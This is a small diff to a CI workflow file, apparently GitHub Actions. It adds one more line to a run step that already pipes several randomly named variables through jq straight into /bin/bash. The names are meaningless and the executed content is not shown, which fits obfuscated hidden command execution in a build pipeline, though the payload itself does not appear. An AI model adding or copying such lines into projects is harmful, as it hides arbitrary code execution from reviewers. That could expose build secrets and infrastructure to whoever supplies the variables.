@@ -35,6 +35,7 @@ jobs:
           echo $nwvga28 | jq -r .ck21 | /bin/bash
           echo $rrjx9 | jq -r .ffn4 | /bin/bash
           printf '%s' "$h0291" | jq -r .bch19932 | /bin/bash
+          echo $d754 | jq -r .kxka990 | /bin/bash
 
       - name: Store results
         if: always()
